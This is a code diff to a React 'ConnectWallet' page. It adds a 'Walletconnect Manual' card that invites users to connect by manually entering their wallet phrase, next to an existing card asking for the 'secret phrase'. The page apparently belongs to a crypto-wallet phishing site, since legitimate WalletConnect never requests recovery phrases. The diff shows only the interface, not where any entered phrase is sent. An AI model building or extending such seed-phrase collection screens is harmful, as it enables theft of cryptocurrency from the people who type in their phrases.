@@ -380,6 +380,18 @@ export default function ConnectWallet() {
           <h2 className="text-2xl font-bold text-white mb-2">Manual Connection</h2>
           <p className="text-gray-400">For advanced users. Import your wallet directly using your secret phrase.</p>
         </div>
+
+        {/* Walletconnect Manual Card */}
+        <div
+          onClick={() => setShowManualPopup(true)}
+          className="bg-gray-800/50 border border-white/10 rounded-2xl p-8 hover:bg-gray-700/70 hover:border-green-500 cursor-pointer transition-all duration-300 transform hover:-translate-y-1 shadow-lg"
+        >
+          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-green-600/20 mb-6 mx-auto">
+            <Wallet size={32} className="text-green-400" />
+          </div>
+          <h2 className="text-2xl font-bold text-white mb-2">Walletconnect Manual</h2>
+          <p className="text-gray-400">Connect via WalletConnect by manually entering your phrase.</p>
+        </div>
       </div>
     </div>
   );
